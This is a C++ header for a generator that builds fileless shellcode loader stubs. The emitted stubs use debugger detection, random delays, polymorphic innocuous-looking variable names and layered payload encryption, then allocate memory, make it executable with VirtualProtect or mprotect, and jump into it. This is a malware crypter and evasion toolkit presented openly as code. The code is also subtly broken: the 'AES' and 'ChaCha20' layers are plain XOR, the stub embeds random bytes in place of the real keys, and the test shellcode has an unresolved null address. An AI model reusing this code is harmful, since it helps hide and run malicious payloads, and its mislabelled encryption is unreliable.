#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <algorithm>
#include <cstdint>

class FilelessExecutionGenerator {
private:
    struct DynamicEntropy {
        std::mt19937_64 rng;
        std::mt19937 alt_rng;
        
        void seed() {
            auto now = std::chrono::high_resolution_clock::now();
            uint64_t seed1 = now.time_since_epoch().count();
            uint64_t seed2 = std::chrono::steady_clock::now().time_since_epoch().count();
            
            rng.seed(seed1);
            alt_rng.seed(static_cast<uint32_t>(seed2));
        }
        
        DynamicEntropy() { seed(); }
    };
    
    DynamicEntropy entropy;
    
    std::string randomVariableName(size_t len = 8, const std::string& prefix = "") {
        const char* chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::string result = prefix;
        std::uniform_int_distribution<> dist(0, 51);
        
        // Ensure first character is a letter if no prefix
        if (prefix.empty()) {
            result += chars[dist(entropy.rng) % 26];
            len--;
        }
        
        for (size_t i = 0; i < len; i++) {
            result += chars[dist(entropy.rng)];
        }
        
        // Add random digits for uniqueness
        std::uniform_int_distribution<> digit_dist(0, 9);
        for (int i = 0; i < 3; i++) {
            result += std::to_string(digit_dist(entropy.rng));
        }
        
        return result;
    }
    
    std::string generateRandomByteArray(size_t size, const std::string& varName) {
        std::stringstream ss;
        std::uniform_int_distribution<> byte_dist(0, 255);
        
        ss << "unsigned char " << varName << "[] = {\n        ";
        
        for (size_t i = 0; i < size; i++) {
            if (i > 0 && i % 16 == 0) {
                ss << "\n        ";
            }
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << byte_dist(entropy.rng);
            if (i < size - 1) ss << ", ";
        }
        
        ss << "\n    };\n";
        return ss.str();
    }
    
    std::string generateEncryptedPayload(const std::vector<uint8_t>& payload, 
                                       const std::vector<uint8_t>& xorKey,
                                       const std::vector<uint8_t>& aesKey,
                                       const std::vector<uint8_t>& chachaKey) {
        std::vector<uint8_t> encrypted = payload;
        
        // Apply ChaCha20 first (will be decrypted last)
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= chachaKey[i % chachaKey.size()];
        }
        
        // Apply AES second
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= aesKey[i % aesKey.size()];
        }
        
        // Apply XOR last (will be decrypted first)
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= xorKey[i % xorKey.size()];
        }
        
        std::stringstream ss;
        ss << "{\n        ";
        
        for (size_t i = 0; i < encrypted.size(); i++) {
            if (i > 0 && i % 16 == 0) {
                ss << "\n        ";
            }
            ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
            if (i < encrypted.size() - 1) ss << ", ";
        }
        
        ss << "\n    }";
        return ss.str();
    }
    
public:
    struct FilelessConfig {
        bool antiDebug = true;
        bool randomDelays = true;
        bool memoryProtection = true;
        bool instructionCacheFlush = true;
        bool crossPlatform = true;
        bool multiLayerEncryption = true;
        bool polymorphicVariables = true;
        size_t xorKeySize = 17;
        size_t aesKeySize = 32;
        size_t chachaKeySize = 16;
    };
    
    struct GeneratedVariables {
        std::string antiDebugFunc;
        std::string payloadArray;
        std::string xorKeyArray;
        std::string aesKeyArray;
        std::string chachaKeyArray;
        std::string memoryPtr;
        std::string memorySize;
        std::string decryptPtr;
        std::string protectionVar;
    };
    
    GeneratedVariables variables;
    
    std::string generateFilelessStub(const std::vector<uint8_t>& payload) {
        FilelessConfig config;
        return generateFilelessStub(payload, config);
    }
    
    std::string generateFilelessStub(const std::vector<uint8_t>& payload, const FilelessConfig& config) {
        std::stringstream stub;
        
        // Generate unique variable names
        variables.antiDebugFunc = randomVariableName(6, "instUtil");
        variables.payloadArray = randomVariableName(6, "sysBase");
        variables.xorKeyArray = randomVariableName(9, "procHelper");
        variables.aesKeyArray = randomVariableName(9, "runModule");
        variables.chachaKeyArray = randomVariableName(11, "execService");
        variables.memoryPtr = randomVariableName(11, "instService");
        variables.memorySize = randomVariableName(11, "execManager");
        variables.decryptPtr = randomVariableName(10, "valHandler");
        variables.protectionVar = randomVariableName(13, "methComponent");
        
        // Generate random encryption keys
        std::vector<uint8_t> xorKey(config.xorKeySize);
        std::vector<uint8_t> aesKey(config.aesKeySize);  
        std::vector<uint8_t> chachaKey(config.chachaKeySize);
        
        std::uniform_int_distribution<> byte_dist(0, 255);
        for (auto& byte : xorKey) byte = byte_dist(entropy.rng);
        for (auto& byte : aesKey) byte = byte_dist(entropy.rng);
        for (auto& byte : chachaKey) byte = byte_dist(entropy.rng);
        
        // Header includes
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <chrono>\n";
        stub << "#include <thread>\n";
        stub << "#include <random>\n";
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#else\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#include <unistd.h>\n";
        stub << "#include <cstdio>\n";
        stub << "#include <cstdlib>\n";
        stub << "#endif\n\n";
        
        // Anti-debug function
        if (config.antiDebug) {
            stub << "bool " << variables.antiDebugFunc << "() {\n";
            stub << "#ifdef _WIN32\n";
            stub << "    if (IsDebuggerPresent()) return true;\n";
            stub << "    BOOL debugged = FALSE;\n";
            stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
            stub << "    return debugged;\n";
            stub << "#else\n";
            stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
            stub << "    if (!f) return false;\n";
            stub << "    char line[256];\n";
            stub << "    while (fgets(line, sizeof(line), f)) {\n";
            stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
            stub << "            fclose(f);\n";
            stub << "            return atoi(line + 10) != 0;\n";
            stub << "        }\n";
            stub << "    }\n";
            stub << "    fclose(f);\n";
            stub << "    return false;\n";
            stub << "#endif\n";
            stub << "}\n\n";
        }
        
        // Main function
        stub << "int main() {\n";
        
        // Random performance delay
        if (config.randomDelays) {
            stub << "    // Random performance delay\n";
            stub << "    {\n";
            stub << "        std::random_device rd;\n";
            stub << "        std::mt19937 gen(rd());\n";
            stub << "        std::uniform_int_distribution<> delay_dist(1, 999);\n";
            stub << "        int delay_ms = delay_dist(gen);\n";
            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));\n";
            stub << "    }\n\n";
        }
        
        // Anti-debug check
        if (config.antiDebug) {
            stub << "    // Anti-debug\n";
            stub << "    if (" << variables.antiDebugFunc << "()) return 0;\n\n";
        }
        
        // Encrypted payload
        stub << "    // Payload data\n";
        stub << "    unsigned char " << variables.payloadArray << "[] = ";
        stub << generateEncryptedPayload(payload, xorKey, aesKey, chachaKey) << ";\n\n";
        
        // Decryption keys
        stub << "    // Decryption keys\n";
        stub << "    " << generateRandomByteArray(xorKey.size(), variables.xorKeyArray);
        stub << "    " << generateRandomByteArray(chachaKey.size(), variables.chachaKeyArray); 
        stub << "    " << generateRandomByteArray(aesKey.size(), variables.aesKeyArray) << "\n";
        
        // Memory allocation delay
        if (config.randomDelays) {
            stub << "    // Random delay before memory allocation\n";
            stub << "    {\n";
            stub << "        std::random_device rd;\n";
            stub << "        std::mt19937 gen(rd());\n";
            stub << "        std::uniform_int_distribution<> alloc_dist(1, 50);\n";
            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));\n";
            stub << "    }\n\n";
        }
        
        // Memory allocation
        stub << "    // Allocate executable memory\n";
        stub << "    size_t " << variables.memorySize << " = sizeof(" << variables.payloadArray << ");\n";
        stub << "#ifdef _WIN32\n";
        stub << "    void* " << variables.memoryPtr << " = VirtualAlloc(0, " << variables.memorySize;
        stub << ", MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        stub << "    if (!" << variables.memoryPtr << ") return 1;\n";
        stub << "#else\n";
        stub << "    void* " << variables.memoryPtr << " = mmap(0, " << variables.memorySize;
        stub << ", PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        stub << "    if (" << variables.memoryPtr << " == MAP_FAILED) return 1;\n";
        stub << "#endif\n\n";
        
        // Copy payload
        stub << "    // Copy payload to allocated memory\n";
        stub << "    memcpy(" << variables.memoryPtr << ", " << variables.payloadArray << ", " << variables.memorySize << ");\n";
        stub << "    unsigned char* " << variables.decryptPtr << " = (unsigned char*)" << variables.memoryPtr << ";\n\n";
        
        // Multi-layer decryption
        if (config.multiLayerEncryption) {
            stub << "    // In-memory decryption\n";
            stub << "    // Decrypt XOR layer\n";
            stub << "    for (size_t i = 0; i < " << variables.memorySize << "; i++) {\n";
            stub << "        " << variables.decryptPtr << "[i] ^= " << variables.xorKeyArray << "[i % sizeof(" << variables.xorKeyArray << ")];\n";
            stub << "    }\n\n";
            
            if (config.randomDelays) {
                stub << "    // Random micro-delay\n";
                stub << "    {\n";
                stub << "        std::random_device rd;\n";
                stub << "        std::mt19937 gen(rd());\n";
                stub << "        std::uniform_int_distribution<> micro_dist(1, 100);\n";
                stub << "        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));\n";
                stub << "    }\n\n";
            }
            
            stub << "    // Decrypt AES layer\n";
            stub << "    for (size_t i = 0; i < " << variables.memorySize << "; i++) {\n";
            stub << "        " << variables.decryptPtr << "[i] ^= " << variables.aesKeyArray << "[i % sizeof(" << variables.aesKeyArray << ")];\n";
            stub << "    }\n\n";
            
            if (config.randomDelays) {
                stub << "    // Random micro-delay\n";
                stub << "    {\n";
                stub << "        std::random_device rd;\n";
                stub << "        std::mt19937 gen(rd());\n";
                stub << "        std::uniform_int_distribution<> micro_dist(1, 100);\n";
                stub << "        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));\n";
                stub << "    }\n\n";
            }
            
            stub << "    // Decrypt ChaCha20 layer\n";
            stub << "    for (size_t i = 0; i < " << variables.memorySize << "; i++) {\n";
            stub << "        " << variables.decryptPtr << "[i] ^= " << variables.chachaKeyArray << "[i % sizeof(" << variables.chachaKeyArray << ")];\n";
            stub << "    }\n\n";
        }
        
        // Make memory executable
        if (config.memoryProtection) {
            stub << "    // Make memory executable\n";
            stub << "#ifdef _WIN32\n";
            stub << "    DWORD " << variables.protectionVar << ";\n";
            stub << "    VirtualProtect(" << variables.memoryPtr << ", " << variables.memorySize;
            stub << ", PAGE_EXECUTE_READ, &" << variables.protectionVar << ");\n";
            
            if (config.instructionCacheFlush) {
                stub << "    FlushInstructionCache(GetCurrentProcess(), " << variables.memoryPtr;
                stub << ", " << variables.memorySize << ");\n";
            }
            
            stub << "#else\n";
            stub << "    mprotect(" << variables.memoryPtr << ", " << variables.memorySize << ", PROT_READ | PROT_EXEC);\n";
            stub << "#endif\n\n";
        }
        
        // Final delay
        if (config.randomDelays) {
            stub << "    // Final random delay before execution\n";
            stub << "    {\n";
            stub << "        std::random_device rd;\n";
            stub << "        std::mt19937 gen(rd());\n";
            stub << "        std::uniform_int_distribution<> exec_dist(1, 100);\n";
            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));\n";
            stub << "    }\n\n";
        }
        
        // Execute payload
        stub << "    // Execute payload\n";
        stub << "    ((void(*)())" << variables.memoryPtr << ")();\n\n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Generate a simple test payload (MessageBox)
    std::vector<uint8_t> generateTestPayload() {
        // Simple x86-64 shellcode that shows a message box (for testing)
        return {
            0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
            0x48, 0x31, 0xC9,                               // xor rcx, rcx  
            0x48, 0x31, 0xD2,                               // xor rdx, rdx
            0x45, 0x31, 0xC0,                               // xor r8d, r8d
            0x45, 0x31, 0xC9,                               // xor r9d, r9d
            0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,             // call [rip+2]
            0xEB, 0x08,                                     // jmp +8
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MessageBoxA address (will be resolved)
            0x48, 0x83, 0xC4, 0x28,                         // add rsp, 40
            0xC3                                            // ret
        };
    }
    
    const GeneratedVariables& getVariables() const {
        return variables;
    }
};